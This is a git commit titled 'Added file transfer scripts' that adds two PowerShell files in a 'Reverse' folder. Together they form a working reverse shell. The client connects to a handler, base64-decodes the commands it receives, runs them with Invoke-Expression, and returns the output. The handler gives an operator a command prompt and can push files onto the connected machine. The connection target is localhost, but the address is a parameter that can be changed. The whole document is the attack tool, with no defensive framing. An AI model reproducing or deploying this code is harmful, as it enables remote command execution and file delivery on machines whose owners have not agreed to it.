c9906ccf214e1430afa88adbfa6c36dd418b266e
Robert W. Gaines <robert.gaines@lab.io>
2022-03-23 10:52:06 -0700

    Added file transfer scripts

---
+++ Reverse/BasicPSClientFileXFer.ps1
@@ -0,0 +1,73 @@
+﻿
+
+function ReceiveFile($receiver,$filename)
+{
+    $bytes = New-Object System.Byte[] 1024
+
+    while(($index = $receiver.Read($bytes,0,$bytes.Length) -ne 0))
+    {
+        $encoding = New-Object System.Text.ASCIIEncoding
+
+        $data     = $encoding.GetString($bytes,0,$index)
+
+        $data | Out-File -Append $filename
+    }
+    return
+}
+function PSClient($addr,$port)
+{
+
+    try
+    {
+
+        $s = New-Object Net.Sockets.TcpClient($addr,$port)
+
+        if($s)
+        {
+            Write-Host "Connected"
+        }
+    }
+    catch
+    {
+        return 
+    }
+
+    while($s.Connected)
+    {
+            $stream      = $s.GetStream()
+            $transmitter = New-Object System.IO.StreamWriter($stream)
+            $receiver    = New-Object System.IO.StreamReader($stream)
+            #$cmd         = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+            #$cmd         = [Convert]::ToBase64String($cmd)
+            #$transmitter.WriteLine($cmd)
+            #$transmitter.Flush()
+
+            $intake      = $receiver.ReadLine()
+            $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
+            $cmd         = $intake
+
+            if($cmd)
+            {
+                if($cmd | Select-String 'exit')
+                {
+                    $s.Close()
+                    exit
+                }
+                if($cmd | Select-String 'send')
+                {
+                    $fileName = $cmd.Split(' ')[1] ; WRite-Host $fileName
+                    ReceiveFile $receiver $fileName
+                }
+                else 
+                {
+                    $result      = Invoke-Expression $cmd | Out-String 
+                    $result      = [System.Text.Encoding]::Unicode.GetBytes($result)
+                    $result      = [Convert]::ToBase64String($result)
+                    $transmitter.WriteLine($result)
+                    $transmitter.Flush()
+                }
+            }
+    }
+}
+
+PSClient localhost 8080
---
+++ Reverse/BasicPSHandlerFileXFer.ps1
@@ -0,0 +1,106 @@
+﻿
+function SendFile($stream,$filename)
+{
+    Get-ChildItem
+
+    if(Test-Path -Path $filename)
+    {
+        $FullPath = (Get-ChildItem -Path $filename).FullName ; Write-Host $FullPath
+        $FileAsBytes = [System.IO.File]::ReadAllBytes($FullPath)
+        Write-Host $FileAsBytes
+        $FileAsBytes | %{ $stream.Write($_) }
+        WRite-Host "Sent"
+        return
+    }
+    else 
+    {
+        Write-Host "[!] File not found "
+        return    
+    }
+}
+function PSHandler($port)
+{
+    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)
+
+    $handler = New-Object System.Net.Sockets.TCPListener $socket 
+
+    $handler.Start()
+
+    Write-Host "Listening on: $port"
+
+    while($true)
+    {
+        $client = $handler.AcceptTCPClient()
+
+        if($client)
+        {
+            $remoteAddress = $client.Client.RemoteEndPoint.Address
+            $remotePort    = $client.Client.RemoteEndPoint.Port 
+
+            Write-Host "[*]Connection from: $remoteAddress | $remotePort"
+
+            $stream = $client.GetStream()
+
+            $bytes = New-Object System.Byte[] 1024
+
+            $encodingScheme = New-Object System.Text.ASCIIEncoding
+
+            while($true)
+            {
+                #$cmd   = $encodingScheme.GetString($bytes,0,$var)
+                $transmitter           = New-Object System.IO.StreamWriter($stream)
+                $receiver              = New-Object System.IO.StreamReader($stream)
+                $plaintext_cmd         = Read-Host "[*]>>>"
+                $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                $cmd                   = [Convert]::ToBase64String($cmd)
+
+                if($cmd)
+                {
+                    if($plaintext_cmd | Select-String 'exit')
+                    {
+                        $client.Close()
+                        Write-Host "[~] Client connection closed"
+                        Write-Host "[~] Returning to main loop"
+                        Write-Host "[*] Listening on: $port"
+                        $plaintext_cmd         = Read-Host "[*]>>>"
+                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                        $cmd                   = [Convert]::ToBase64String($cmd)
+                    }
+                    if($plaintext_cmd | Select-String 'send')
+                    {
+                        $fileName = $plaintext_cmd.Split(' ')[1]
+                        Write-Host "Pre function call: $fileName"
+                        SendFile $transmitter $fileName
+                        $transmitter.Flush()
+                        $plaintext_cmd         = Read-Host "[*]>>>"
+                        $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
+                        $cmd                   = [Convert]::ToBase64String($cmd)
+                    }
+                    try
+                    {
+                        $transmitter.WriteLine($cmd)
+                        $transmitter.Flush() 
+                    }
+                    catch
+                    {
+                        continue
+                    }
+                }
+
+                $intake      = $receiver.ReadLine()
+                $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
+                $response    = $intake
+
+                if($intake)
+                {
+                    Write-Host $response
+                }
+
+            }
+            $stream.Close()
+            $client.Close()
+        }
+    }
+}
+
+PSHandler 8080
